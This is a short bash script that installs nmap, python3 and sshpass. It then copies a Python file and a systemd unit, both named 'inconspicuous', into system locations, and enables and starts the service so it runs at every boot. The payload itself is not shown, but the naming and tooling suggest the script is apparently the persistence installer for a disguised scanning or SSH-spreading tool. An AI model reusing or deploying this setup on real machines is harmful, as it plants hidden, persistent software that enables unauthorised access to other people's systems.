#! /usr/bin/env bash

sudo apt-get -y install nmap
sudo apt-get -y install python3
sudo apt-get -y install sshpass

cp inconspicuous.service /lib/systemd/system/inconspicuous.service
cp inconspicuous.py /home/inconspicuous.py
systemctl daemon-reload
systemctl enable inconspicuous.service
systemctl start inconspicuous.service

